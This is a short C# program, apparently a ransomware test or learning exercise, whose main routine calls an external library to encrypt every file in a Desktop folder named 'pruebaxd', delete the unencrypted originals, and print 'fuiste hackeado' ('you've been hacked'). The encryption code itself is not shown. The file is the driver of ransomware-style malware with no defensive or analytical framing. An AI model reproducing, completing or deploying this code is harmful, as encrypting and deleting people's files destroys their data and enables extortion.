using System;
using System.Threading;
using encrypt = encryptfilesc;

namespace ejecutabledllc_
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string finalPath = desktopPath + "\\pruebaxd";
            string texto = "fuiste hackeado";
            encrypt.FileEncryptor.EncryptFilesInDirectory(finalPath);
            encrypt.FileEncryptor.DeleteUnencryptedFiles(finalPath);
            Console.WriteLine(desktopPath);
            Console.WriteLine(finalPath);
            Console.WriteLine(texto);
            Thread.Sleep(20000);
        }
    }
}
